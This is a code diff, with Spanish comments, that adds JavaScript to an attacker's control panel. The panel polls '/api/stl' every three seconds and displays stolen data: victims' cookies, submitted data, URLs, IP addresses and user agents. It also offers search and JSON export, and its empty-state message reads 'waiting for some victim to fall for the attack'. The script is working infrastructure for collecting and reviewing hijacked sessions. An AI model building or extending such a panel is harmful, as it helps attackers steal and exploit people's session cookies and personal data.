@@ -332,5 +332,138 @@
                 .catch(error => console.log('⚠️ Error al actualizar:', error));
         }, 10000);
     </script>
+    <script>
+// ============================================================
+// AUTO-ACTUALIZACIÓN EN TIEMPO REAL
+// ============================================================
+
+// Función para cargar nuevos datos
+function cargarDatos() {
+    fetch('/api/stl')
+        .then(response => response.json())
+        .then(data => {
+            // Actualizar el contador de datos robados
+            const totalElement = document.querySelector('.stat .num');
+            if (totalElement) {
+                totalElement.textContent = data.length;
+            }
+            
+            // Verificar si hay nuevos datos
+            const lista = document.getElementById('lista-robos');
+            if (lista) {
+                // Si no hay datos, mostrar mensaje
+                if (data.length === 0) {
+                    lista.innerHTML = `
+                        <div class="sin-datos">
+                            <h2>😴 No hay datos robados todavía</h2>
+                            <p>Esperando que alguna víctima caiga en el ataque...</p>
+                            <div class="empty-icon">🎣</div>
+                        </div>
+                    `;
+                    return;
+                }
+                
+                // Si hay datos, actualizar la lista
+                let html = '';
+                data.forEach(robo => {
+                    // Escapar caracteres especiales para evitar problemas
+                    const cookie = robo.cookie || 'No se envio cookie';
+                    const dataField = robo.data || 'No se envió data';
+                    const url = robo.url_completa || 'No se envió URL';
+                    const userAgent = robo.user_agent || 'No especificado';
+                    
+                    html += `
+                        <div class="robo" data-ip="${robo.ip || ''}" data-cookie="${cookie}" data-data="${dataField}">
+                            <div style="display: flex; justify-content: space-between; align-items: start; flex-wrap: wrap; gap: 5px;">
+                                <div>
+                                    <span class="fecha">📅 ${new Date(robo.fecha).toLocaleString('es-ES')}</span>
+                                    <span class="ip">🌐 ${robo.ip || '127.0.0.1'}</span>
+                                    <span class="badge">ID: ${robo.id}</span>
+                                </div>
+                                <span class="expandir" onclick="toggleDetalle(this)">▶ Ver más</span>
+                            </div>
+                            <div class="user-agent">📱 ${userAgent.substring(0, 80)}${userAgent.length > 80 ? '…' : ''}</div>
+                            <div class="cookie">🍪 <strong>Cookie:</strong> ${cookie.substring(0, 150)}${cookie.length > 150 ? '…' : ''}</div>
+                            <div class="data">📦 <strong>Data:</strong> ${dataField.substring(0, 150)}${dataField.length > 150 ? '…' : ''}</div>
+                            <div class="url">🔗 <strong>URL:</strong> ${url.substring(0, 80)}${url.length > 80 ? '…' : ''}</div>
+                            
+                            <div class="detalle">
+                                <strong>🍪 Cookie completa:</strong><br>
+                                <code class="text-gold" style="word-break: break-all;">${cookie}</code>
+                                <br><br>
+                                <strong>📦 Data completa:</strong><br>
+                                <code class="text-green" style="word-break: break-all;">${dataField}</code>
+                                <br><br>
+                                <strong>🔗 URL completa:</strong><br>
+                                <code class="text-blue" style="word-break: break-all;">${url}</code>
+                                <br><br>
+                                <strong>📱 User-Agent completo:</strong><br>
+                                <code class="text-purple" style="word-break: break-all;">${userAgent}</code>
+                            </div>
+                        </div>
+                    `;
+                });
+                
+                lista.innerHTML = html;
+                
+                // Mostrar el número de víctimas
+                const victimasElement = document.querySelectorAll('.stat .num')[1];
+                if (victimasElement) {
+                    victimasElement.textContent = data.length;
+                }
+            }
+        })
+        .catch(error => {
+            console.log('⚠️ Error al cargar datos:', error);
+        });
+}
+
+// Cargar datos al inicio
+cargarDatos();
+
+// Actualizar cada 3 segundos (¡MUY RÁPIDO!)
+setInterval(cargarDatos, 3000);
+
+// También actualizar cuando la pestaña se active
+document.addEventListener('visibilitychange', function() {
+    if (!document.hidden) {
+        cargarDatos();
+    }
+});
+
+// Función para alternar el detalle
+function toggleDetalle(elemento) {
+    const detalle = elemento.parentElement.parentElement.querySelector('.detalle');
+    if (detalle) {
+        detalle.classList.toggle('mostrar');
+        elemento.textContent = detalle.classList.contains('mostrar') ? '▶ Ocultar' : '▶ Ver más';
+    }
+}
+
+// Función para filtrar
+function filtrar() {
+    const busqueda = document.getElementById('buscar').value.toLowerCase();
+    const robos = document.querySelectorAll('.robo');
+    
+    robos.forEach(robo => {
+        const ip = robo.dataset.ip ? robo.dataset.ip.toLowerCase() : '';
+        const cookie = robo.dataset.cookie ? robo.dataset.cookie.toLowerCase() : '';
+        const data = robo.dataset.data ? robo.dataset.data.toLowerCase() : '';
+        
+        if (ip.includes(busqueda) || cookie.includes(busqueda) || data.includes(busqueda)) {
+            robo.style.display = 'block';
+        } else {
+            robo.style.display = 'none';
+        }
+    });
+}
+
+// Función para exportar JSON
+function exportarJSON() {
+    window.location.href = '/api/stl';
+}
+
+console.log('🔄 Panel en tiempo real activo - Actualizando cada 3 segundos');
+</script>
 </body>
 </html>
